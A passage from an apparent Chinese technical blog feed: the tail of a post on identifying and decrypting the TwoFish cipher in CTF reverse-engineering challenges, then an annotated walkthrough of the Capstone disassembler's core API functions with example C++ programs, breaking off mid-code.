(len&lt;<span class="number">24</span>)  n = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">32</span>)  n = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">key_t</span>* tf_key = (<span class="keyword">key_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">key_t</span>));</span><br><span class="line">    <span class="keyword">uint8_t</span>* ss = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(n);</span><br><span class="line">    <span class="comment">/* Do actual padding. */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> g=<span class="number">0</span>; g&lt;n; ++g)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            *(ss+g) = *(s+g);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(ss+g) = <span class="number">0x00</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tf_key-&gt;k = ss;</span><br><span class="line">    tf_key-&gt;len=n;</span><br><span class="line">    <span class="keyword">return</span> tf_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> gf(<span class="keyword">uint8_t</span> x, <span class="keyword">uint8_t</span> y, <span class="keyword">uint16_t</span> m)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> c, p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">0x1</span>)</span><br><span class="line">            p ^= x;</span><br><span class="line">        c = x &amp; <span class="number">0x80</span>;</span><br><span class="line">        x &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (c)</span><br><span class="line">            x ^= m;</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>写一个main函数直接调用即可。</p><h2 id="CTF出题变化分析"><a href="#CTF出题变化分析" class="headerlink" title="CTF出题变化分析"></a>CTF出题变化分析</h2><p>TwoFish算法共有三处可发生变化以提高出题难度</p><ol><li>rsm函数，0x14d可替换为其他数字</li><li>Twofish_generate_ext_s_keys函数中gf的参数0x166可替换</li><li>Twofish_mds_mul函数中gf的参数0x166可替换</li></ol><p>对于这类分组加密算法，即使插件没有识别，只要看出相关函数结构，就可以很快确定具体算法，找到可能变化的参数，相应修改解密函数即可</p><p>附件中附上了题目和idb文件供自行分析</p><p>From <a href="https://kabeor.github.io/逆向分析加解密之TwoFish算法/">https://kabeor.github.io/逆向分析加解密之TwoFish算法/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向分析加解密之TwoFish算法&quot;&gt;&lt;a href=&quot;#逆向分析加解密之TwoFish算法&quot; class=&quot;headerlink&quot; title=&quot;逆向分析加解密之TwoFish算法&quot;&gt;&lt;/a&gt;逆向分析加解密之TwoFish算法&lt;/h1&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="TwoFish算法" scheme="https://kabeor.github.io/tags/TwoFish%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(三)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%89)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(三)/</id>
    <published>2019-07-22T05:20:08.274Z</published>
    <updated>2019-07-29T04:08:28.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-三"><a href="#Capstone反汇编引擎数据类型及API分析及示例-三" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(三)"></a>Capstone反汇编引擎数据类型及API分析及示例(三)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5772" target="_blank" rel="noopener">https://xz.aliyun.com/t/5772</a></p></blockquote><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-open"><a href="#cs-open" class="headerlink" title="cs_open"></a>cs_open</h3><p><code>cs_err CAPSTONE_API cs_open(cs_arch arch, cs_mode mode, csh *handle);</code></p><p>初始化cs句柄</p><p>参数<br>arch: 架构类型 (CS<em>ARCH</em><em>)<br>mode: 硬件模式. CS<em>MODE</em></em>在cs_mode数据类型中可查<br>handle: 指向句柄, 返回时更新<br>return: 创建成功返回CS_ERR_OK，否则返回cs_err枚举中对应的错误信息</p><p>实现代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_open</span><span class="params">(cs_arch arch, cs_mode mode, csh *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">ud</span>;</span></span><br><span class="line"><span class="keyword">if</span> (!cs_mem_malloc || !cs_mem_calloc || !cs_mem_realloc || !cs_mem_free || !cs_vsnprintf)</span><br><span class="line"><span class="comment">// Error: 使用cs_open()前, 必须使用cs_option(CS_OPT_MEM)进行动态内存管理的初始化</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_MEMSETUP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arch &lt; CS_ARCH_MAX &amp;&amp; cs_arch_init[arch]) &#123;</span><br><span class="line"><span class="comment">// 验证架构是否使用，方式：架构在枚举中且可初始化</span></span><br><span class="line"><span class="keyword">if</span> (mode &amp; cs_arch_disallowed_mode_mask[arch]) &#123;</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_MODE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ud = cs_mem_calloc(<span class="number">1</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line"><span class="keyword">if</span> (!ud) &#123;</span><br><span class="line"><span class="comment">// 内存不足</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_MEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ud-&gt;errnum = CS_ERR_OK;</span><br><span class="line">ud-&gt;arch = arch;</span><br><span class="line">ud-&gt;mode = mode;</span><br><span class="line"><span class="comment">// 默认情况指令不打开detail模式</span></span><br><span class="line">ud-&gt;detail = CS_OPT_OFF;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认skipdata设置</span></span><br><span class="line">ud-&gt;skipdata_setup.mnemonic = SKIPDATA_MNEM;</span><br><span class="line"></span><br><span class="line">err = cs_arch_init[ud-&gt;arch](ud);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">cs_mem_free(ud);</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*handle = (<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_ARCH;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，cs_struct结构体包含更多细节设定，如下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line">Printer_t printer;<span class="comment">// 打印asm</span></span><br><span class="line"><span class="keyword">void</span> *printer_info; <span class="comment">// 打印信息</span></span><br><span class="line">Disasm_t disasm;<span class="comment">// 反编译</span></span><br><span class="line"><span class="keyword">void</span> *getinsn_info; <span class="comment">// 打印辅助信息</span></span><br><span class="line">GetName_t reg_name;</span><br><span class="line">GetName_t insn_name;</span><br><span class="line">GetName_t group_name;</span><br><span class="line">GetID_t insn_id;</span><br><span class="line">PostPrinter_t post_printer;</span><br><span class="line">cs_err errnum;</span><br><span class="line">ARM_ITStatus ITBlock;<span class="comment">// ARM特殊选项</span></span><br><span class="line">cs_opt_value detail, imm_unsigned;</span><br><span class="line"><span class="keyword">int</span> syntax;<span class="comment">//ARM, Mips &amp; PPC等架构的基本asm语法打印</span></span><br><span class="line"><span class="keyword">bool</span> doing_mem;<span class="comment">// 在InstPrinter代码中处理内存操作数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> *insn_cache;<span class="comment">//为mapping.c建立缓存索引</span></span><br><span class="line">GetRegisterName_t get_regname;</span><br><span class="line"><span class="keyword">bool</span> skipdata;<span class="comment">// 如果反编译时要跳过数据，该项设置为True</span></span><br><span class="line"><span class="keyword">uint8_t</span> skipdata_size;<span class="comment">//要跳过bytes的数量</span></span><br><span class="line">cs_opt_skipdata skipdata_setup;<span class="comment">// 自定义skipdata设置</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *regsize_map;<span class="comment">//映射register大小 (目前仅支持x86)</span></span><br><span class="line">GetRegisterAccess_t reg_access;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">mnem_list</span>;</span><span class="comment">// 自定义指令助记符的链接list</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>示例(创建一个x86_64类型的cs句柄)：<br><code>cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)</code></p><h3 id="cs-close"><a href="#cs-close" class="headerlink" title="cs_close"></a>cs_close</h3><p><code>cs_err CAPSTONE_API cs_close(csh *handle);</code></p><p>释放句柄<br>参数<br>handle: 指向一个cs_open()打开的句柄<br>return: 释放成功返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>实现代码，可以看出释放句柄实质为将句柄值设置为0</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_close</span><span class="params">(csh *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">ud</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">next</span>, *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*handle == <span class="number">0</span>)</span><br><span class="line"><span class="comment">// 句柄不可用</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_CSH;</span><br><span class="line"></span><br><span class="line">ud = (struct cs_struct *)(*handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ud-&gt;printer_info)</span><br><span class="line">cs_mem_free(ud-&gt;printer_info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放自定义助记符的链接list</span></span><br><span class="line">tmp = ud-&gt;mnem_list;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line">next = tmp-&gt;next;</span><br><span class="line">cs_mem_free(tmp);</span><br><span class="line">tmp = next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(ud-&gt;insn_cache);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(ud, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line">cs_mem_free(ud);</span><br><span class="line"></span><br><span class="line"><span class="comment">// handle值设置为0，保证这个句柄在cs_close()释放后不可使用</span></span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br><code>cs_close(&amp;handle);</code></p><h3 id="cs-option"><a href="#cs-option" class="headerlink" title="cs_option"></a>cs_option</h3><p><code>cs_err CAPSTONE_API cs_option(csh handle, cs_opt_type type, size_t value);</code></p><p>反编译引擎的运行时选项</p><p>handle: cs_open()打开的句柄<br>type: 设置选项的类型<br>value: 与type对应的选项值<br>return: 设置成功返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>注意: 在CS_OPT_MEM的情况下，handle可以是任何值，因此cs_option(handle, CS_OPT_MEM, value)必须在cs_open()之前被调用</p><p>实现代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_option</span><span class="params">(csh ud, cs_opt_type type, <span class="keyword">size_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line">cs_opt_mnem *opt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持在所有API前支持 (even cs_open())</span></span><br><span class="line"><span class="keyword">if</span> (type == CS_OPT_MEM) &#123;</span><br><span class="line">cs_opt_mem *mem = (cs_opt_mem *)value;</span><br><span class="line"></span><br><span class="line">cs_mem_malloc = mem-&gt;<span class="built_in">malloc</span>;</span><br><span class="line">cs_mem_calloc = mem-&gt;<span class="built_in">calloc</span>;</span><br><span class="line">cs_mem_realloc = mem-&gt;<span class="built_in">realloc</span>;</span><br><span class="line">cs_mem_free = mem-&gt;<span class="built_in">free</span>;</span><br><span class="line">cs_vsnprintf = mem-&gt;vsnprintf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle)</span><br><span class="line"><span class="keyword">return</span> CS_ERR_CSH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(type) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_UNSIGNED:</span><br><span class="line">handle-&gt;imm_unsigned = (cs_opt_value)value;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_DETAIL:</span><br><span class="line">handle-&gt;detail = (cs_opt_value)value;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_SKIPDATA:</span><br><span class="line">handle-&gt;skipdata = (value == CS_OPT_ON);</span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata) &#123;</span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_size == <span class="number">0</span>) &#123;</span><br><span class="line">handle-&gt;skipdata_size = skipdata_size(handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_SKIPDATA_SETUP:</span><br><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">handle-&gt;skipdata_setup = *((cs_opt_skipdata *)value);</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_MNEMONIC:</span><br><span class="line">opt = (cs_opt_mnem *)value;</span><br><span class="line"><span class="keyword">if</span> (opt-&gt;id) &#123;</span><br><span class="line"><span class="keyword">if</span> (opt-&gt;mnemonic) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加新指令或替换现有指令</span></span><br><span class="line"><span class="comment">// 查看当前insn释放在list中</span></span><br><span class="line">tmp = handle-&gt;mnem_list;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;insn.id == opt-&gt;id) &#123;</span><br><span class="line"><span class="comment">// f找到指令，替换助记符</span></span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">strncpy</span>(tmp-&gt;insn.mnemonic, opt-&gt;mnemonic, <span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>);</span><br><span class="line">tmp-&gt;insn.mnemonic[<span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 如果没有就添加这条指令</span></span><br><span class="line"><span class="keyword">if</span> (!tmp) &#123;</span><br><span class="line">tmp = cs_mem_malloc(<span class="keyword">sizeof</span>(*tmp));</span><br><span class="line">tmp-&gt;insn.id = opt-&gt;id;</span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">strncpy</span>(tmp-&gt;insn.mnemonic, opt-&gt;mnemonic, <span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>);</span><br><span class="line">tmp-&gt;insn.mnemonic[<span class="keyword">sizeof</span>(tmp-&gt;insn.mnemonic) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="comment">// 新指令放在list最前面</span></span><br><span class="line">tmp-&gt;next = handle-&gt;mnem_list;</span><br><span class="line">handle-&gt;mnem_list = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct insn_mnem *prev, *tmp;</span><br><span class="line"></span><br><span class="line">tmp = handle-&gt;mnem_list;</span><br><span class="line">prev = tmp;</span><br><span class="line"><span class="keyword">while</span>(tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;insn.id == opt-&gt;id) &#123;</span><br><span class="line"><span class="comment">// 删除指令</span></span><br><span class="line"><span class="keyword">if</span> (tmp == prev) &#123;</span><br><span class="line">handle-&gt;mnem_list = tmp-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">prev-&gt;next = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">cs_mem_free(tmp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">prev = tmp;</span><br><span class="line">tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CS_OPT_MODE:</span><br><span class="line"><span class="comment">// 验证所请求的模式是否有效</span></span><br><span class="line"><span class="keyword">if</span> (value &amp; cs_arch_disallowed_mode_mask[handle-&gt;arch]) &#123;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_OPTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cs_arch_option[handle-&gt;arch](handle, type, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例，更改反汇编后显示的语法：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT);  <span class="comment">// 以AT&amp;T语法显示</span></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出</p><p><img src="https://i.loli.net/2019/07/22/5d35b1e72c20515640.jpg" alt></p><h3 id="cs-errno"><a href="#cs-errno" class="headerlink" title="cs_errno"></a>cs_errno</h3><p><code>cs_err CAPSTONE_API cs_errno(csh handle);</code></p><p>API出错时返回错误消息<br>参数<br>handle: cs_open()打开的句柄<br>return: 无错误返回CS_ERR_OK,否则返回cs_err枚举的错误信息</p><p>实现很简单，判断到句柄不存在直接返回CS_ERR_CSH</p><p>示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; cs_errno(handle);    <span class="comment">//关闭句柄后检查将报错</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，错误码4即CS_ERR_CSH<br><img src="https://i.loli.net/2019/07/22/5d35bad79c9c384228.jpg" alt></p><h3 id="cs-strerror"><a href="#cs-strerror" class="headerlink" title="cs_strerror"></a>cs_strerror</h3><p><code>const char * CAPSTONE_API cs_strerror(cs_err code);</code></p><p>将上个API输出的错误码转换为详细错误信息</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> * CAPSTONE_API <span class="title">cs_strerror</span><span class="params">(cs_err code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(code) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Unknown error code"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_OK:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"OK (CS_ERR_OK)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MEM:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Out of memory (CS_ERR_MEM)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_ARCH:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid/unsupported architecture(CS_ERR_ARCH)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_HANDLE:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid handle (CS_ERR_HANDLE)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_CSH:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid csh (CS_ERR_CSH)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MODE:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid mode (CS_ERR_MODE)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_OPTION:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Invalid option (CS_ERR_OPTION)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_DETAIL:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Details are unavailable (CS_ERR_DETAIL)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_MEMSETUP:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Dynamic memory management uninitialized (CS_ERR_MEMSETUP)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_VERSION:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Different API version between core &amp; binding (CS_ERR_VERSION)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_DIET:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Information irrelevant in diet engine (CS_ERR_DIET)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_SKIPDATA:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Information irrelevant for 'data' instruction in SKIPDATA mode (CS_ERR_SKIPDATA)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_ATT:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"AT&amp;T syntax is unavailable (CS_ERR_X86_ATT)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_INTEL:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"INTEL syntax is unavailable (CS_ERR_X86_INTEL)"</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ERR_X86_MASM:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"MASM syntax is unavailable (CS_ERR_X86_MASM)"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例，结合cs_errno使用：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 